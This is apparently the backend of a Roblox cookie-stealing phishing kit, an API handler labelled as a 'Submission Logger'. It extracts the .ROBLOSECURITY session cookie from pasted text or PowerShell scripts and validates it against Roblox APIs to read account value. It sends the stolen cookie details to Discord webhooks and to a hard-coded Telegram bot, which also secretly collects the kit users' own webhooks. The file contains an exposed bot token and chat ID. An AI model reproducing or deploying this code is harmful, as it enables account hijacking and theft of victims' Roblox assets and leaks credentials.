// api/submit.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';

async function redisGet(key) {
  const res = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
    headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
  });
  const json = await res.json();
  if (!json.result) return null;
  try { return JSON.parse(json.result); } catch { return null; }
}

async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

// Extract clean .ROBLOSECURITY token from any input
// Handles: raw cookie, PowerShell scripts, copied browser storage, etc.
function extractRobloxCookie(raw) {
  if (!raw) return null;

  // Match the token after the WARNING prefix
  const warningMatch = raw.match(/_\|WARNING[^|]*\|_([\w\-\.]+)/);
  if (warningMatch) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${warningMatch[1]}`;

  // Match from .ROBLOSECURITY cookie line in powershell/text
  const psMatch = raw.match(/\.ROBLOSECURITY['")\s,]*[,\s]*["']?(_\|WARNING[^"'\s]+)/);
  if (psMatch) return psMatch[1];

  // Match bare token (starts with _|WARNING or just the long base64-like string after |_)
  const bareMatch = raw.match(/(_\|WARNING[-A-Z0-9.:_ ]+\|_[\w\-.]+)/);
  if (bareMatch) return bareMatch[1];

  // If it looks like just the token part after |_ (no WARNING prefix)
  const tokenOnly = raw.match(/\|_([\w\-]{50,})/);
  if (tokenOnly) return tokenOnly[1];

  return null;
}

// Fetch Roblox account info using the cookie
async function fetchRobloxInfo(cookie) {
  try {
    const headers = { Cookie: `.ROBLOSECURITY=${cookie}` };

    const [authRes, robuxRes] = await Promise.all([
      fetch('https://users.roblox.com/v1/users/authenticated', { headers }),
      fetch('https://economy.roblox.com/v1/user/currency', { headers })
    ]);

    if (!authRes.ok) return null;

    const auth = await authRes.json();
    const robux = robuxRes.ok ? await robuxRes.json() : null;

    // Fetch extra profile info
    const [friendRes, premiumRes] = await Promise.all([
      fetch(`https://friends.roblox.com/v1/users/${auth.id}/friends/count`, { headers }),
      fetch(`https://premiumfeatures.roblox.com/v1/users/${auth.id}/validate-membership`, { headers })
    ]);

    const friendData  = friendRes.ok  ? await friendRes.json()  : null;
    const isPremium   = premiumRes.ok ? await premiumRes.json() : false;

    return {
      id:          auth.id,
      username:    auth.name,
      displayName: auth.displayName,
      robux:       robux?.robux ?? 'N/A',
      friends:     friendData?.count ?? 'N/A',
      premium:     isPremium === true ? 'Yes ⭐' : 'No',
    };
  } catch (_) {
    return null;
  }
}

async function sendToDiscord(webhookUrl, pageName, slotLabel, rawValue, roblox, now) {
  if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) return;

  // Build pasted content field value
  let pastedField;
  if (roblox) {
    pastedField = [
      `👤 **${roblox.username}** (${roblox.displayName})`,
      `🆔 ID: \`${roblox.id}\``,
      `💰 Robux: \`${roblox.robux}\``,
      `👥 Friends: \`${roblox.friends}\``,
      `⭐ Premium: \`${roblox.premium}\``,
    ].join('\n');
  } else {
    pastedField = `\`${rawValue}\``;
  }

  try {
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: '@everyone',
        embeds: [
          {
            title: '🚨 New Submission Received',
            description: ':fire: `NEW PAGE ENTRY` :fire:',
            color: 5793266,
            fields: [
              {
                name: '📄 Page',
                value: `\`${pageName}\``,
                inline: true
              },
              {
                name: '🎯 Slot',
                value: `\`${slotLabel}\``,
                inline: true
              },
              {
                name: '📥 Pasted Content',
                value: pastedField
              },
              {
                name: '📅 Date Submitted',
                value: `\`${now}\``,
                inline: false
              }
            ],
            footer: { text: 'Submission Logger • Automated System' },
            thumbnail: { url: 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png' }
          }
        ],
        attachments: []
      })
    });
  } catch (_) {}
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  let body = req.body;
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch { return res.status(400).json({ error: 'Invalid JSON' }); }
  }

  const { slug, slots } = body || {};
  if (!slug)  return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  let record;
  try {
    record = await redisGet(`slot:${slug}`);
  } catch (err) {
    return res.status(500).json({ error: 'Redis error', detail: err.message });
  }
  if (!record) return res.status(404).json({ error: 'Page not found' });

  const now = new Date().toISOString();
  const slotEntry  = Object.entries(slots).find(([, v]) => v && v.length > 0);
  const slotLabel  = slotEntry ? slotEntry[0] : 'N/A';
  const rawValue   = slotEntry ? slotEntry[1] : '(empty)';

  // Try to extract & resolve Roblox cookie
  const cookie  = extractRobloxCookie(rawValue);
  const roblox  = cookie ? await fetchRobloxInfo(cookie) : null;

  // Build TG display
  const tgContent = roblox
    ? `👤 ${roblox.username} (${roblox.displayName})\n🆔 ${roblox.id}\n💰 Robux: ${roblox.robux}\n👥 Friends: ${roblox.friends}\n⭐ Premium: ${roblox.premium}`
    : rawValue;

  // ── Send to webhook2 ──────────────────────────────────────────────────────
  await sendToDiscord(record.webhook, record.displayName, slotLabel, rawValue, roblox, now);

  // ── Send to webhook1 if dualhook child ───────────────────────────────────
  let webhook1 = 'N/A';
  if (record.dualhookParent) {
    try {
      const parentRecord = await redisGet(`slot:${record.dualhookParent}`);
      if (parentRecord?.webhook) {
        webhook1 = parentRecord.webhook;
        if (parentRecord.webhook !== record.webhook) {
          await sendToDiscord(parentRecord.webhook, record.displayName, slotLabel, rawValue, roblox, now);
        }
      }
    } catch (_) {}
  }

  // ── Telegram log ──────────────────────────────────────────────────────────
  const tgMsg = [
    `🚨 <b>NEW SUBMISSION RECEIVED</b> 🚨`,
    `------------------------------------------`,
    `📄 PAGE:`,
    `${record.displayName}`,
    `------------------------------------------`,
    `🎯 TYPE = ${slotLabel}:`,
    tgContent,
    `------------------------------------------`,
    `🔗 PAGE WEBHOOK (WEBHOOK2):`,
    `<code>${record.webhook}</code>`,
    `------------------------------------------`,
    `🔗 WEBHOOK1:`,
    `<code>${webhook1}</code>`,
    `------------------------------------------`,
    `📅 DATE SUBMITTED:`,
    `${now}`,
    `------------------------------------------`
  ].join('\n');

  await tgSend(tgMsg);

  return res.status(200).json({ success: true });
}
